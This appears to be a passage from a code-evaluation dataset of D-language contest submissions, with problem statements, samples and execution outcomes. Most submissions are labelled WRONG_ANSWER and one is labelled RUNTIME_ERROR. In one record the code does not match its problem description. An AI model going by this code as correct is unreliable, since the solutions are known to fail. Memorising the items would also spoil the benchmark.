b[2][19] \", \" a[2][20] > b[2][20] \", \n        \"a[2][21] > b[2][21] \", \" a[2][22] > b[2][22] \", \" a[2][23] > b[2][23] \", \n        \"a[2][24] > b[2][24] \", \" a[2][25] > b[2][25] \", \" a[2][26] > b[2][26] \", \n        \"a[2][27] > b[2][27] \", \" a[2][28] > b[2][28] \", \" a[2][29] > b[2][29] \", \n        \"a[2][30] > b[2][30] \", \" a[2][31] > b[2][31] \", \" a[2][32] > b[2][32] \", \n        \"a[2][33] > b[2][33] \", \" a[2][34] > b[2][34] \", \" a[2][35] > b[2][35] \", \n        \"a[2][36] > b[2][36] \", \" a[2][37] > b[2][37] \", \" a[2][38] > b[2][38] \", \n        \"a[2][39] > b[2][39] \", \" a[2][40] > b[2][40] \", \" a[2][41] > b[2][41] \", \n        \"a[2][42] > b[2][42] \", \" a[2][43] > b[2][43] \", \" a[2][44] > b[2][44] \", \n        \"a[2][45] > b[2][45] \", \" a[2][46] > b[2][46] \", \" a[2][47] > b[2][47] \", \n        \"a[2][48] > b[2][48] \", \" a[2][49] > b[2][49] \");\n    writeln(arr[0][0]);\n    arr.multiSort!(\n        \"a[2][0] > b[2][0] \", \" a[2][1] > b[2][1] \", \" a[2][2] > b[2][2] \", \n        \"a[2][3] > b[2][3] \", \" a[2][4] > b[2][4] \", \" a[2][5] > b[2][5] \", \n        \"a[2][6] > b[2][6] \", \" a[2][7] > b[2][7] \", \" a[2][8] > b[2][8] \", \n        \"a[2][9] > b[2][9] \", \" a[2][10] > b[2][10] \", \" a[2][11] > b[2][11] \", \n        \"a[2][12] > b[2][12] \", \" a[2][13] > b[2][13] \", \" a[2][14] > b[2][14] \", \n        \"a[2][15] > b[2][15] \", \" a[2][16] > b[2][16] \", \" a[2][17] > b[2][17] \", \n        \"a[2][18] > b[2][18] \", \" a[2][19] > b[2][19] \", \" a[2][20] > b[2][20] \", \n        \"a[2][21] > b[2][21] \", \" a[2][22] > b[2][22] \", \" a[2][23] > b[2][23] \", \n        \"a[2][24] > b[2][24] \", \" a[2][25] > b[2][25] \", \" a[2][26] > b[2][26] \", \n        \"a[2][27] > b[2][27] \", \" a[2][28] > b[2][28] \", \" a[2][29] > b[2][29] \", \n        \"a[2][30] > b[2][30] \", \" a[2][31] > b[2][31] \", \" a[2][32] > b[2][32] \", \n        \"a[2][33] > b[2][33] \", \" a[2][34] > b[2][34] \", \" a[2][35] > b[2][35] \", \n        \"a[2][36] > b[2][36] \", \" a[2][37] > b[2][37] \", \" a[2][38] > b[2][38] \", \n        \"a[2][39] > b[2][39] \", \" a[2][40] > b[2][40] \", \" a[2][41] > b[2][41] \", \n        \"a[2][42] > b[2][42] \", \" a[2][43] > b[2][43] \", \" a[2][44] > b[2][44] \", \n        \"a[2][45] > b[2][45] \", \" a[2][46] > b[2][46] \", \" a[2][47] > b[2][47] \", \n        \"a[2][48] > b[2][48] \", \" a[2][49] > b[2][49] \");\n    writeln(arr[0][0]);\n}\n ","description":"Formula One championship consists of series of races called Grand Prix. After every race drivers receive points according to their final position. Only the top 10 drivers receive points in the following order 25, 18, 15, 12, 10, 8, 6, 4, 2, 1. At the conclusion of the championship the driver with most points is the champion. If there is a tie, champion is the one with most wins (i.e. first places). If a tie still exists, it is chosen the one with most second places, and so on, until there are no more place to use for compare. Last year another scoring system was proposed but rejected. In it the champion is the one with most wins. If there is tie, champion is the one with most points. If a tie still exists it is proceeded the same way as in the original scoring system, that is comparing number of second, third, forth, and so on, places.You are given the result of all races during the season and you are to determine the champion according to both scoring systems. It is guaranteed, that both systems will produce unique champion.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contain integer t (1\u2264t\u226420), where t is the number of races. After that all races are described one by one. Every race description start with an integer n (1\u2264n\u226450) on a line of itself, where n is the number of clasified drivers in the given race. After that n lines follow with the classification for the race, each containing the name of a driver. The names of drivers are given in order from the first to the last place. The name of the driver consists of lowercase and uppercase English letters and has length at most 50 characters. Comparing of names should be case-sensetive.\n","output_spec":"Your output should contain exactly two line. On the first line is the name of the champion according to the original rule, and on the second line the name of the champion according to the alternative rule.\n","notes":"It is not guaranteed that the same drivers participate in all races. For the championship consider every driver that has participated in at least one race. The total number of drivers during the whole season is not more then 50.\n","sample_inputs":["3\n3\nHamilton\nVettel\nWebber\n2\nWebber\nVettel\n2\nHamilton\nVettel\n","2\n7\nProst\nSurtees\nNakajima\nSchumacher\nButton\nDeLaRosa\nBuemi\n8\nAlonso\nProst\nNinoFarina\nJimClark\nDeLaRosa\nNakajima\nPatrese\nSurtees\n"],"sample_outputs":["Vettel\nHamilton\n","Prost\nProst\n"]}
{"difficulty":800,"lang":"D","lang_cluster":"d","src_uid":"47_A","submission_id":"9874475","tags":["brute+force","math"],"exec_outcome":"WRONG_ANSWER","source_code":"import std.stdio;\n\nconst int MOD = 1000003;\n\nint main() {\n    int n;\n    scanf(\"%d\", &n);\n    for (int i = 1; i <= 30; ++i)\n\tif (i * (i + 1) \/ 2 == n) {\n\t    writeln(\"YES\");\n\t    return 0;\n\t}\n    writeln(\"NO\");\n    return 0;\n}\n","description":"A triangular number is the number of dots in an equilateral triangle uniformly filled with dots. For example, three dots can be arranged in a triangle; thus three is a triangular number. The n-th triangular number is the number of dots in a triangle with n dots on a side. . You can learn more about these numbers from Wikipedia (http:\/\/en.wikipedia.org\/wiki\/Triangular_number).Your task is to find out if a given integer is a triangular number.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains the single number n (1\u2264n\u2264500) \u2014 the given integer.\n","output_spec":"If the given integer is a triangular number output YES, otherwise output NO.\n","notes":null,"sample_inputs":["1\n","2\n","3\n"],"sample_outputs":["YES\n","NO\n","YES\n"]}
{"difficulty":800,"lang":"D","lang_cluster":"d","src_uid":"4_A","submission_id":"200813083","tags":["brute+force","math"],"exec_outcome":"WRONG_ANSWER","source_code":"import std;\n\nvoid main()\n{\n    readln().strip.to!int % 2 == 0 ? \"YES\".writeln : \"NO\".writeln;\n}","description":"One hot summer day Pete and his friend Billy decided to buy a watermelon. They chose the biggest and the ripest one, in their opinion. After that the watermelon was weighed, and the scales showed w kilos. They rushed home, dying of thirst, and decided to divide the berry, however they faced a hard problem.Pete and Billy are great fans of even numbers, that's why they want to divide the watermelon in such a way that each of the two parts weighs even number of kilos, at the same time it is not obligatory that the parts are equal. The boys are extremely tired and want to start their meal as soon as possible, that's why you should help them and find out, if they can divide the watermelon in the way they want. For sure, each of them should get a part of positive weight.","input_from":"standard input","output_to":"standard output","input_spec":"The first (and the only) input line contains integer number w (1\u2264w\u2264100) \u2014 the weight of the watermelon bought by the boys.\n","output_spec":"Print YES, if the boys can divide the watermelon into two parts, each of them weighing even number of kilos; and NO in the opposite case.\n","notes":"For example, the boys can divide the watermelon into two parts of 2 and 6 kilos respectively (another variant \u2014 two parts of 4 and 4 kilos).\n","sample_inputs":["8\n"],"sample_outputs":["YES\n"]}
{"difficulty":1200,"lang":"D","lang_cluster":"d","src_uid":"4_B","submission_id":"5232794","tags":["constructive+algorithms","greedy"],"exec_outcome":"WRONG_ANSWER","source_code":"import std.stdio;\r\nimport std.conv;\r\nimport std.string;\r\nimport std.typecons;\r\nimport std.algorithm;\r\nimport std.array;\r\nimport std.range;\r\nimport std.math;\r\nimport std.regex;\r\n\r\nvoid main()\r\n{\r\n  int[][] times;\r\n  int sum, diff;\r\n\r\n  auto input = readln().split().map!(to!int)();\r\n\r\n  a:foreach (s; stdin.byLine()) {\r\n  \tauto t = s.split().map!(to!int)().array();\r\n\r\n  \twhile (sum + t[1] > input[1]) {\r\n  \t\tif (t[1] - 1 >= t[0]) {\r\n  \t\t\tt[1]--;\r\n  \t\t} else {\r\n  \t\t\tdiff = sum + t[1] - input[1];\r\n  \t\t\tforeach_reverse (tt; times) {\r\n  \t\t\t\twhile (tt[0] != tt[1] && diff) {\r\n  \t\t\t\t\ttt[1]--;\r\n  \t\t\t\t\tdiff--;\r\n  \t\t\t\t\tsum--;\r\n  \t\t\t\t}\r\n  \t\t\t}\r\n  \t\t}\r\n  \t\tif (diff) {writeln(\"u\");break a;}\r\n  \t}\r\n\r\n  \ttimes ~= t;\r\n  \tsum += t[1];\r\n  }\r\n\r\n  if (sum != input[1] || diff) {\r\n  \twriteln(\"NO\");\r\n  } else {\r\n  \twriteln(\"YES\");\r\n  \tforeach (t; times[0 .. $-1]) {\r\n  \t\twrite(t[1], \" \");\r\n  \t}\r\n  \twriteln(times[$-1][1]);\r\n  }\r\n  \r\n}","description":"Tomorrow Peter has a Biology exam. He does not like this subject much, but d days ago he learnt that he would have to take this exam. Peter's strict parents made him prepare for the exam immediately, for this purpose he has to study not less than minTimei and not more than maxTimei hours per each i-th day. Moreover, they warned Peter that a day before the exam they would check how he has followed their instructions.So, today is the day when Peter's parents ask him to show the timetable of his preparatory studies. But the boy has counted only the sum of hours sumTime spent him on preparation, and now he wants to know if he can show his parents a timetable s\u0441hedule with d numbers, where each number s\u0441hedulei stands for the time in hours spent by Peter each i-th day on biology studies, and satisfying the limitations imposed by his parents, and at the same time the sum total of all schedulei should equal to sumTime.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains two integer numbers d,sumTime (1\u2264d\u226430,0\u2264sumTime\u2264240) \u2014 the amount of days, during which Peter studied, and the total amount of hours, spent on preparation. Each of the following d lines contains two integer numbers minTimei,maxTimei (0\u2264minTimei\u2264maxTimei\u22648), separated by a space \u2014 minimum and maximum amount of hours that Peter could spent in the i-th day.\n","output_spec":"In the first line print YES, and in the second line print d numbers (separated by a space), each of the numbers \u2014 amount of hours, spent by Peter on preparation in the corresponding day, if he followed his parents' instructions; or print NO in the unique line. If there are many solutions, print any of them.\n","notes":null,"sample_inputs":["1 48\n5 7\n","2 5\n0 1\n3 5\n"],"sample_outputs":["NO\n","YES\n1 4 "]}
{"difficulty":900,"lang":"D","lang_cluster":"d","src_uid":"572_A","submission_id":"15877811","tags":["sortings"],"exec_outcome":"WRONG_ANSWER","source_code":"import std.stdio, std.range, std.string, std.conv, std.algorithm;\nimport std.math;\n\nvoid main() {\n    readln;\n    int k, m;\n    readf(\"%d %d\\n\", &k, &m);\n    int[] a = readln.chomp.split.map!(to!int).array;\n    int[] b = readln.chomp.split.map!(to!int).array;\n\n    if (a[k - 1] < b[0]) {\n        \"YES\".writeln;\n    } else {\n        \"NO\".writeln;\n    }\n}","description":"You are given two arrays A and B consisting of integers, sorted in non-decreasing order. Check whether it is possible to choose k numbers in array A and choose m numbers in array B so that any number chosen in the first array is strictly less than any number chosen in the second array.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers nA,nB (1\u2264nA,nB\u226410^5), separated by a space \u2014 the sizes of arrays A and B, correspondingly.\nThe second line contains two integers k and m (1\u2264k\u2264nA,1\u2264m\u2264nB), separated by a space.\nThe third line contains nA numbers a1,a2,... anA (-10^9\u2264a1\u2264a2\u2264...\u2264anA\u226410^9), separated by spaces \u2014 elements of array A.\nThe fourth line contains nB integers b1,b2,... bnB (-10^9\u2264b1\u2264b2\u2264...\u2264bnB\u226410^9), separated by spaces \u2014 elements of array B.\n","output_spec":"Print \"YES\" (without the quotes), if you can choose k numbers in array A and m numbers in array B so that any number chosen in array A was strictly less than any number chosen in array B. Otherwise, print \"NO\" (without the quotes).\n","notes":"In the first sample test you can, for example, choose numbers 1 and 2 from array A and number 3 from array B (1 < 3 and 2 < 3).\nIn the second sample test the only way to choose k elements in the first array and m elements in the second one is to choose all numbers in both arrays, but then not all the numbers chosen in A will be less than all the numbers chosen in B: .\n","sample_inputs":["3 3\n2 1\n1 2 3\n3 4 5\n","3 3\n3 3\n1 2 3\n3 4 5\n","5 2\n3 1\n1 1 1 1 1\n2 2\n"],"sample_outputs":["YES\n","NO\n","YES\n"]}
{"difficulty":800,"lang":"D","lang_cluster":"d","src_uid":"71_A","submission_id":"211784523","tags":["strings"],"exec_outcome":"WRONG_ANSWER","source_code":"import std.stdio;\nimport std.string;\nimport std.format;\n\nvoid main() {\n    int n;\n    string ans;\n    formattedRead(strip(readln()), \"%d\", n);\n    while(n-- > 0) {\n        string s = strip(readln());\n        if (s.length > 10)\n            ans ~= s[0] ~ \"10\" ~ s[$ - 1];\n        else\n            ans ~= s;\n        if (n > 0) ans ~= \"\\n\";\n    }\n    writeln(ans);\n}","description":"Sometimes some words like \"localization\" or \"internationalization\" are so long that writing them many times in one text is quite tiresome.Let's consider a word too long, if its length is strictly more than 10 characters. All too long words should be replaced with a special abbreviation.This abbreviation is made like this: we write down the first and the last letter of a word and between them we write the number of letters between the first and the last letters. That number is in decimal system and doesn't contain any leading zeroes.Thus, \"localization\" will be spelt as \"l10n\", and \"internationalization\u00bb will be spelt as \"i18n\".You are suggested to automatize the process of changing the words with abbreviations. At that all too long words should be replaced by the abbreviation and the words that are not too long should not undergo any changes.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer n (1\u2264n\u2264100). Each of the following n lines contains one word. All the words consist of lowercase Latin letters and possess the lengths of from 1 to 100 characters.\n","output_spec":"Print n lines. The i-th line should contain the result of replacing of the i-th word from the input data.\n","notes":null,"sample_inputs":["4\nword\nlocalization\ninternationalization\npneumonoultramicroscopicsilicovolcanoconiosis\n"],"sample_outputs":["word\nl10n\ni18n\np43s\n"]}
{"difficulty":1300,"lang":"D","lang_cluster":"d","src_uid":"71_B","submission_id":"215870671","tags":["implementation","math"],"exec_outcome":"WRONG_ANSWER","source_code":"import std.format;\r\nimport std.stdio;\r\n\r\nvoid main() {\r\n    int n, k, t;\r\n    readf(\"%s %s %s\\n\", n, k, t);\r\n    int progress = cast(int)(cast(real)(t * n * k) \/ 100.0);\r\n    int full = progress \/ k;\r\n    foreach (i; 0..full) \"%d \".format(k).write;\r\n    \"%d \".format(progress - full * k).write;\r\n    foreach (i; 0..n - full - 1) \"%d \".format(0).write;\r\n    writeln;\r\n}","description":"A progress bar is an element of graphical interface that displays the progress of a process for this very moment before it is completed. Let's take a look at the following form of such a bar.A bar is represented as n squares, located in line. To add clarity, let's number them with positive integers from 1 to n from the left to the right. Each square has saturation (ai for the i-th square), which is measured by an integer from 0 to k. When the bar for some i (1\u2264i\u2264n) is displayed, squares 1,2,... ,i-1 has the saturation k, squares i+1,i+2,... ,n has the saturation 0, and the saturation of the square i can have any value from 0 to k.So some first squares of the progress bar always have the saturation k. Some last squares always have the saturation 0. And there is no more than one square that has the saturation different from 0 and k.The degree of the process's completion is measured in percents. Let the process be t% completed. Then the following inequation is fulfilled: An example of such a bar can be seen on the picture. For the given n, k, t determine the measures of saturation for all the squares ai of the progress bar.","input_from":"standard input","output_to":"standard output","input_spec":"We are given 3 space-separated integers n, k, t (1\u2264n,k\u2264100, 0\u2264t\u2264100).\n","output_spec":"Print n numbers. The i-th of them should be equal to ai.\n","notes":null,"sample_inputs":["10 10 54\n","11 13 37\n"],"sample_outputs":["10 10 10 10 10 4 0 0 0 0 ","13 13 13 13 0 0 0 0 0 0 0 "]}
{"difficulty":1000,"lang":"D","lang_cluster":"d","src_uid":"859_B","submission_id":"30693119","tags":["brute+force","geometry","math"],"exec_outcome":"RUNTIME_ERROR","source_code":"import std.stdio, std.array, std.string, std.conv, std.algorithm;\nimport std.typecons, std.range, std.random, std.math, std.container;\nimport std.numeric, std.bigint, core.bitop, core.stdc.stdio;\n\nint point(int x, int y) {\n    if (32 * x <= y) return 3000;\n    else if (16 * x <= y) return 2500;\n    else if (8 * x <= y) return 2000;\n    else if (4 * x <= y) return 1500;\n    else if (2 * x <= y) return 1000;\n    else return 500;\n}\n\nvoid main() {\n    auto N = readln.chomp.to!int;\n    auto A = N.iota.map!(_ => readln.split.map!(to!int).array).array;\n\n    auto solved = new int[](5);\n    foreach (i; 0..N) foreach (j; 0..5) if (A[i][j] != -1) solved[j] += 1;\n\n    auto ud = new int[](5);\n    foreach (i; 0..5) {\n        if (A[0][i] == A[1][i]) ud[i] = 0;\n        else if (A[0][i] == -1) ud[i] = -1;\n        else if (A[1][i] == -1) ud[i] = 1;\n        else if (A[0][i] > A[1][i]) ud[i] = -1;\n        else if (A[0][i] < A[1][i]) ud[i] = 1;\n    }\n\n    auto P = new int[](N);\n    foreach (i; 0..5) P[i] = point(solved[i], N);\n\n    int ans = -1;\n    foreach (i; 0..10000) {\n        int v, p;\n        foreach (j; 0..5) {\n            if (ud[i] > 0) P[i] = point(solved[i], N);\n            else P[i] = point(solved[i] + i, N);\n            if (A[0][i] != -1) v += P[i] \/ 250 * (250 - A[0][i]);\n            if (A[1][i] != -1) p += P[i] \/ 250 * (250 - A[1][i]);\n        }\n        if (v > p) {\n            ans = i;\n            break;\n        }\n    }\n\n    ans.writeln;\n}\n","description":"Your security guard friend recently got a new job at a new security company. The company requires him to patrol an area of the city encompassing exactly N city blocks, but they let him choose which blocks. That is, your friend must walk the perimeter of a region whose area is exactly N blocks. Your friend is quite lazy and would like your help to find the shortest possible route that meets the requirements. The city is laid out in a square grid pattern, and is large enough that for the sake of the problem it can be considered infinite.","input_from":"standard input","output_to":"standard output","input_spec":"Input will consist of a single integer N (1\u2264N\u226410^6), the number of city blocks that must be enclosed by the route.\n","output_spec":"Print the minimum perimeter that can be achieved.\n","notes":"Here are some possible shapes for the examples:\n\n","sample_inputs":["4\n","11\n","22\n"],"sample_outputs":["8\n","14\n","20\n"]}
{"difficulty":900,"lang":"D","lang_cluster":"d","src_uid":"981_A","submission_id":"38704833","tags":["brute+force","implementation","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"import std.algorithm;\r\nimport std.array;\r\nimport std.container;\r\nimport std.conv;\r\nimport std.math;\r\nimport std.range;\r\nimport std.stdio;\r\nimport std.string;\r\nimport std.typecons;\r\n\r\nvoid main()\r\n{\r\n    auto s = readln.chomp.map!(to!dchar).array;\r\n    \r\n    int ans = 0;\r\n    auto isPal = (dchar[] s) => s == s.retro.array;\r\n    foreach ( st; 0..s.length ) {\r\n        foreach ( end; st+1..s.length ) {\r\n            if ( !isPal( s[st..end] ) ) ans = cast(int) max( ans, cast(int) end - st );\r\n        }\r\n    }\r\n    \r\n    writeln( ans );\r\n}","description":"A string is a palindrome if it reads the same from the left to the right and from the right to the left. For example, the strings \"kek\", \"abacaba\", \"r\" and \"papicipap\" are palindromes, while the strings \"abb\" and \"iq\" are not.A substring $$$s[l \\ldots r]$$$ ($$$1\u2264l\u2264r\u2264|s|$$$) of a string $$$s=s_{1}s_{2} \\ldots s_{|s|}$$$ is the string $$$s_{l}s_{l+1} \\ldots s_{r}$$$.Anna does not like palindromes, so she makes her friends call her Ann. She also changes all the words she reads in a similar way. Namely, each word $$$s$$$ is changed into its longest substring that is not a palindrome. If all the substrings of $$$s$$$ are palindromes, she skips the word at all.Some time ago Ann read the word $$$s$$$. What is the word she changed it into?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a non-empty string $$$s$$$ with length at most $$$50$$$ characters, containing lowercase English letters only.\n","output_spec":"If there is such a substring in $$$s$$$ that is not a palindrome, print the maximum length of such a substring. Otherwise print $$$0$$$.\nNote that there can be multiple longest substrings that are not palindromes, but their length is unique.\n","notes":"\"mew\" is not a palindrome, so the longest substring of it that is not a palindrome, is the string \"mew\" itself. Thus, the answer for the first example is $$$3$$$.\nThe string \"uffuw\" is one of the longest non-palindrome substrings (of length $$$5$$$) of the string \"wuffuw\", so the answer for the second example is $$$5$$$.\nAll substrings of the string \"qqqqqqqq\" consist of equal characters so they are palindromes. This way, there are no non-palindrome substrings. Thus, the answer for the third example is $$$0$$$.\n","sample_inputs":["mew\n","wuffuw\n","qqqqqqqq\n"],"sample_outputs":["3\n","5\n","0\n"]}
{"difficulty":2500,"lang":"D","lang_cluster":"d","src_uid":"1017_F","submission_id":"41368968","tags":["brute+force","math"],"exec_outcome":"WRONG_ANSWER","source_code":"import std.algorithm;\r\nimport std.conv;\r\nimport std.range;\r\nimport std.stdio;\r\nimport std.string;\r\n\r\nimmutable int limit = 20_000;\r\n\r\nvoid main ()\r\n{\r\n\tuint n;\r\n\tuint a, b, c, d;\r\n\twhile (readf (\" %s %s %s %s %s\", &n, &a, &b, &c, &d) > 0)\r\n\t{\r\n\t\tauto s = new bool [limit];\r\n\t\ts[] = true;\r\n\t\ts[0] = false;\r\n\t\ts[1] = false;\r\n\t\tfor (uint g = 2; g * g < limit; g++)\r\n\t\t{\r\n\t\t\tif (s[g])\r\n\t\t\t{\r\n\t\t\t\tfor (uint e = g; e * g < limit; e++)\r\n\t\t\t\t{\r\n\t\t\t\t\ts[e * g] = false;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tuint [] p;\r\n\t\tforeach (g; 0..limit)\r\n\t\t{\r\n\t\t\tif (s[g])\r\n\t\t\t{\r\n\t\t\t\tp ~= g;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tuint res = 0;\r\n\t\tn += 1;\r\n\t\tauto t = new bool [limit];\r\n\t\tfor (uint start = 0; start < n; start += limit)\r\n\t\t{\r\n\t\t\tuint finish = min (start + limit, n);\r\n\t\t\tif (start == 0)\r\n\t\t\t{\r\n\t\t\t\tt[] = s[];\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tt[] = true;\r\n\t\t\t\tforeach (g; p)\r\n\t\t\t\t{\r\n\t\t\t\t\tuint lo = (start + g - 1) \/ g * g;\r\n\t\t\t\t\twhile (lo < finish)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tt[lo - start] = false;\r\n\t\t\t\t\t\tlo += g;\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tforeach (i; start..finish)\r\n\t\t\t{\r\n\t\t\t\tif (t[i - start])\r\n\t\t\t\t{\r\n\t\t\t\t\tuint cur = a;\r\n\t\t\t\t\tcur = cur * i + b;\r\n\t\t\t\t\tcur = cur * i + c;\r\n\t\t\t\t\tcur = cur * i + d;\r\n\r\n\t\t\t\t\tuint mult = 0;\r\n\t\t\t\t\tuint k = n;\r\n\t\t\t\t\twhile (k > 0)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tk \/= i;\r\n\t\t\t\t\t\tmult += k;\r\n\t\t\t\t\t}\r\n\t\t\t\t\tres += cur * mult;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t\twriteln (res);\r\n\t}\r\n}\r\n","description":"Notice: unusual memory limit!After the war, destroyed cities in the neutral zone were restored. And children went back to school.The war changed the world, as well as education. In those hard days, a new math concept was created.As we all know, logarithm function can be described as: $$$$$$ \\log(p_1^{a_1}p_2^{a_2}...p_k^{a_2}) = a_1 \\log p_1 + a_2 \\log p_2 + ... + a_k \\log p_k $$$$$$ Where $$$p_1^{a_1}p_2^{a_2}...p_k^{a_2}$$$ is the prime factorization of a integer. A problem is that the function uses itself in the definition. That is why it is hard to calculate.So, the mathematicians from the neutral zone invented this: $$$$$$ \\text{exlog}_f(p_1^{a_1}p_2^{a_2}...p_k^{a_2}) = a_1 f(p_1) + a_2 f(p_2) + ... + a_k f(p_k) $$$$$$Notice that $$$\\text{exlog}_f(1)$$$ is always equal to $$$0$$$.This concept for any function $$$f$$$ was too hard for children. So teachers told them that $$$f$$$ can only be a polynomial of degree no more than $$$3$$$ in daily uses (i.e., $$$f(x) = Ax^3+Bx^2+Cx+D$$$).\"Class is over! Don't forget to do your homework!\" Here it is: $$$$$$ \\sum_{i=1}^n \\text{exlog}_f(i) $$$$$$Help children to do their homework. Since the value can be very big, you need to find the answer modulo $$$2^{32}$$$.","input_from":"standard input","output_to":"standard output","input_spec":"The only line contains five integers $$$n$$$, $$$A$$$, $$$B$$$, $$$C$$$, and $$$D$$$ ($$$1 \\le n \\le 3 \\cdot 10^8$$$, $$$0 \\le A,B,C,D \\le 10^6$$$).\n","output_spec":"Print the answer modulo $$$2^{32}$$$.\n","notes":"In the first sample:\n$$$\\text{exlog}_f(1) = 0$$$\n$$$\\text{exlog}_f(2) = 2$$$\n$$$\\text{exlog}_f(3) = 3$$$\n$$$\\text{exlog}_f(4) = 2 + 2 = 4$$$\n$$$\\text{exlog}_f(5) = 5$$$\n$$$\\text{exlog}_f(6) = 2 + 3 = 5$$$\n$$$\\text{exlog}_f(7) = 7$$$\n$$$\\text{exlog}_f(8) = 2 + 2 + 2 = 6$$$\n$$$\\text{exlog}_f(9) = 3 + 3 = 6$$$\n$$$\\text{exlog}_f(10) = 2 + 5 = 7$$$\n$$$\\text{exlog}_f(11) = 11$$$\n$$$\\text{exlog}_f(12) = 2 + 2 + 3 = 7$$$\n$$$ \\sum_{i=1}^{12} \\text{exlog}_f(i)=63 $$$\nIn the second sample:\n$$$\\text{exlog}_f(1) = 0$$$\n$$$\\text{exlog}_f(2) = (1 \\times 2^3 + 2 \\times 2^2 + 3 \\times 2 + 4) = 26$$$\n$$$\\text{exlog}_f(3) = (1 \\times 3^3 + 2 \\times 3^2 + 3 \\times 3 + 4) = 58$$$\n$$$\\text{exlog}_f(4) = 2 \\times \\text{exlog}_f(2) = 52$$$\n$$$ \\sum_{i=1}^4 \\text{exlog}_f(i)=0+26+58+52=136 $$$\n","sample_inputs":["12 0 0 1 0\n","4 1 2 3 4\n"],"sample_outputs":["63\n","136\n"]}
{"difficulty":2600,"lang":"D","lang_cluster":"d","src_uid":"1091_F","submission_id":"47759076","tags":["constructive+algorithms","greedy"],"exec_outcome":"WRONG_ANSWER","source_code":"import std.algorithm;\r\nimport std.conv;\r\nimport std.range;\r\nimport std.stdio;\r\nimport std.string;\r\n\r\nvoid main ()\r\n{\r\n\tint n;\r\n\twhile (readf (\" %s\", &n) > 0)\r\n\t{\r\n\t\treadln;\r\n\t\tauto d = readln.splitter.map !(to !(long)).array;\r\n\t\tauto s = readln.strip;\r\n\r\n\t\tauto need = new long [n + 1];\r\n\t\tauto grassAhead = new long [n + 1];\r\n\t\tlong cur = 0;\r\n\t\tneed[n] = cur;\r\n\t\tgrassAhead[n] = 0;\r\n\t\tforeach_reverse (i; 0..n)\r\n\t\t{\r\n\t\t\tgrassAhead[i] = grassAhead[i + 1];\r\n\t\t\tswitch (s[i])\r\n\t\t\t{\r\n\t\t\t\tcase 'G': cur -= d[i];\r\n\t\t\t\t    grassAhead[i] += d[i]; break;\r\n\t\t\t\tcase 'W': cur -= d[i]; break;\r\n\t\t\t\tcase 'L': cur += d[i]; break;\r\n\t\t\t\tdefault: assert (false);\r\n\t\t\t}\r\n\t\t\tcur = max (cur, 0);\r\n\t\t\tneed[i] = cur;\r\n\t\t}\r\n\t\tdebug {writeln (need);}\r\n\r\n\t\tbool seenWater = false;\r\n\t\tlong res = 0;\r\n\t\tlong energy = 0;\r\n\t\tlong walkDist = 0;\r\n\t\tlong swimDist = 0;\r\n\t\tlong grassFlown = 0;\r\n\t\tforeach (i; 0..n)\r\n\t\t{\r\n\t\t\tswitch (s[i])\r\n\t\t\t{\r\n\t\t\t\tcase 'G': energy += d[i];\r\n\t\t\t\t    res += d[i] * 5; break;\r\n\t\t\t\tcase 'W': energy += d[i];\r\n\t\t\t\t    seenWater = true;\r\n\t\t\t\t    res += d[i] * 3; break;\r\n\t\t\t\tcase 'L': energy -= d[i];\r\n\t\t\t\t    res += d[i] * 1; break;\r\n\t\t\t\tdefault: assert (false);\r\n\t\t\t}\r\n\t\t\tif (energy < 0)\r\n\t\t\t{\r\n\t\t\t\tres += (seenWater ? 3 : 5) * (-energy);\r\n\t\t\t\tenergy = 0;\r\n\t\t\t}\r\n\t\t\tif (energy > need[i + 1])\r\n\t\t\t{\r\n\t\t\t\tauto delta = energy - need[i + 1];\r\n\t\t\t\tauto deltaGrass = min (delta,\r\n\t\t\t\t    grassAhead[i] - grassFlown);\r\n\t\t\t\tgrassFlown += deltaGrass;\r\n\t\t\t\tres -= 2 * deltaGrass;\r\n\t\t\t\tres -= 1 * (delta - deltaGrass);\r\n\t\t\t\tenergy = need[i + 1];\r\n\t\t\t}\r\n\t\t\tif (s[i] == 'G')\r\n\t\t\t{\r\n\t\t\t\tgrassFlown = max (grassFlown - d[i], 0);\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\twriteln (res);\r\n\t}\r\n}\r\n","description":"Bob is a duck. He wants to get to Alice's nest, so that those two can duck!  Duck is the ultimate animal! (Image courtesy of See Bang)The journey can be represented as a straight line, consisting of $$$n$$$ segments. Bob is located to the left of the first segment, while Alice's nest is on the right of the last segment. Each segment has a length in meters, and also terrain type: grass, water or lava. Bob has three movement types: swimming, walking and flying. He can switch between them or change his direction at any point in time (even when he is located at a non-integer coordinate), and doing so doesn't require any extra time. Bob can swim only on the water, walk only on the grass and fly over any terrain. Flying one meter takes $$$1$$$ second, swimming one meter takes $$$3$$$ seconds, and finally walking one meter takes $$$5$$$ seconds.Bob has a finite amount of energy, called stamina. Swimming and walking is relaxing for him, so he gains $$$1$$$ stamina for every meter he walks or swims. On the other hand, flying is quite tiring, and he spends $$$1$$$ stamina for every meter flown. Staying in place does not influence his stamina at all. Of course, his stamina can never become negative. Initially, his stamina is zero.What is the shortest possible time in which he can reach Alice's nest? ","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer $$$n$$$\u00a0($$$1 \\leq n \\leq 10^5$$$)\u00a0\u2014 the number of segments of terrain. \nThe second line contains $$$n$$$ integers $$$l_1, l_2, \\dots, l_n$$$\u00a0($$$1 \\leq l_i \\leq 10^{12}$$$). The $$$l_i$$$ represents the length of the $$$i$$$-th terrain segment in meters.\nThe third line contains a string $$$s$$$ consisting of $$$n$$$ characters \"G\", \"W\", \"L\", representing Grass, Water and Lava, respectively. \nIt is guaranteed that the first segment is not Lava.\n","output_spec":"Output a single integer $$$t$$$\u00a0\u2014 the minimum time Bob needs to reach Alice. \n","notes":null,"sample_inputs":[],"sample_outputs":[]}
